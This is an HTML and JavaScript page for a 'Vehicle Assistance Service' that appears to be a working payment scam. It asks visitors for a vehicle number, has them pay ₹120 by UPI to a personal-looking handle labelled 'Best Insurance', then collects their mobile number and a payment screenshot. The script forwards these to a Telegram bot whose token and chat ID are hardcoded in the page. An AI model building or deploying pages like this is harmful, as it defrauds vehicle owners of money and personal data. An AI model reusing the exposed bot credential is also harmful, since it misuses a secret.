<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vehicle Assistance Service</title>

<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:Segoe UI,Arial;}

body{
min-height:100vh;
background:linear-gradient(-45deg,#4facfe,#00f2fe,#43e97b,#38f9d7);
background-size:400% 400%;
animation:gradientMove 10s ease infinite;
padding-top:80px;
display:flex;
flex-direction:column;
align-items:center;
perspective:1200px;
}

@keyframes gradientMove{
0%{background-position:0% 50%}
50%{background-position:100% 50%}
100%{background-position:0% 50%}
}

.topbar{
position:fixed;
top:0;
left:0;
width:100%;
height:60px;
background:white;
display:flex;
justify-content:space-between;
align-items:center;
padding:0 15px;
box-shadow:0 8px 25px rgba(0,0,0,0.2);
z-index:1000;
}

.topbar button{
background:#1d2b64;
color:white;
border:none;
padding:8px 14px;
border-radius:12px;
cursor:pointer;
box-shadow:0 6px 0 #0f183d;
}

.topbar button:active{
transform:translateY(4px);
box-shadow:0 2px 0 #0f183d;
}

.card{
width:95%;
max-width:420px;
background:white;
padding:30px;
border-radius:25px;
text-align:center;
transition:transform 0.4s ease;
box-shadow:0 30px 60px rgba(0,0,0,0.3);
}

.card:hover{
transform:rotateX(6deg) rotateY(-6deg);
}

input,button{
width:100%;
padding:14px;
margin-top:14px;
border-radius:14px;
border:1px solid #ddd;
font-size:15px;
}

.mainBtn{
background:#1d2b64;
color:white;
border:none;
cursor:pointer;
box-shadow:0 6px 0 #0f183d;
}

.mainBtn:active{
transform:translateY(4px);
box-shadow:0 2px 0 #0f183d;
}

.neonBtn{
background:#000;
color:#fff;
font-weight:bold;
border:none;
cursor:pointer;
box-shadow:0 8px 0 #111;
animation:neonPulse 1.5s infinite alternate;
}

.neonBtn:active{
transform:translateY(5px);
box-shadow:0 3px 0 #111;
}

@keyframes neonPulse{
from{box-shadow:0 8px 0 #111,0 0 20px #00f2fe;}
to{box-shadow:0 8px 0 #111,0 0 35px #43e97b;}
}

.hidden{display:none;}

.footer{
margin-top:40px;
color:white;
font-size:14px;
}

.footer a{
color:white;
cursor:pointer;
margin:0 5px;
text-decoration:underline;
}

.loader{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(0,0,0,0.85);
display:none;
align-items:center;
justify-content:center;
color:white;
z-index:2000;
}
</style>
</head>

<body>

<div class="topbar">
<button onclick="goHome()">Home</button>
<button onclick="showAbout()">About</button>
</div>

<div class="loader" id="loader">Processing...</div>

<div class="card">

<div id="homePage">
<h3>Enter Vehicle Number</h3>
<input id="vehicle" placeholder="BR-09-AB-1234">
<button class="mainBtn" onclick="goPay()">Continue</button>
</div>

<div id="payPage" class="hidden">
<h3>Service Fee ₹120</h3>

<button class="neonBtn"
onclick="window.location.href='upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR'">
⚡ Pay with UPI
</button>

<input id="mobile" placeholder="Mobile Number">
<input type="file" id="proof">

<button class="mainBtn" onclick="submitForm()">Submit</button>
<button class="mainBtn" onclick="goHome()">Back</button>
</div>

<div id="aboutPage" class="hidden">
<h3>About</h3>
<p>We provide vehicle assistance and insurance related services.</p>
<button class="mainBtn" onclick="goHome()">Back</button>
</div>

<div id="disclaimerPage" class="hidden">
<h3>Disclaimer</h3>
<p>This is a private assistance platform.  
We are not affiliated with any government authority.</p>
<button class="mainBtn" onclick="goHome()">Back</button>
</div>

</div>

<div class="footer">
© 2026 Mishra Service |
<a onclick="showAbout()">About</a> |
<a onclick="showDisclaimer()">Disclaimer</a>
</div>

<script>

const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
const chatId="5600045707";

function goHome(){
homePage.classList.remove("hidden");
payPage.classList.add("hidden");
aboutPage.classList.add("hidden");
disclaimerPage.classList.add("hidden");
vehicle.value="";
mobile.value="";
proof.value="";
}

function showAbout(){
homePage.classList.add("hidden");
payPage.classList.add("hidden");
aboutPage.classList.remove("hidden");
disclaimerPage.classList.add("hidden");
}

function showDisclaimer(){
homePage.classList.add("hidden");
payPage.classList.add("hidden");
aboutPage.classList.add("hidden");
disclaimerPage.classList.remove("hidden");
}

function goPay(){
if(!vehicle.value.trim()){
alert("Enter vehicle number");
return;
}
homePage.classList.add("hidden");
payPage.classList.remove("hidden");
}

function submitForm(){
if(mobile.value.length<10){
alert("Enter valid mobile");
return;
}
if(!proof.files[0]){
alert("Upload screenshot");
return;
}

document.getElementById("loader").style.display="flex";

let data=new FormData();
data.append("chat_id",chatId);
data.append("caption","Vehicle: "+vehicle.value+"\nMobile: "+mobile.value);
data.append("photo",proof.files[0]);

fetch("https://api.telegram.org/bot"+token+"/sendPhoto",{
method:"POST",
body:data
})
.then(()=>{
document.getElementById("loader").style.display="none";
alert("Submitted Successfully");
goHome();
})
.catch(()=>{
document.getElementById("loader").style.display="none";
alert("Submission Failed");
});
}

</script>

</body>
</html>
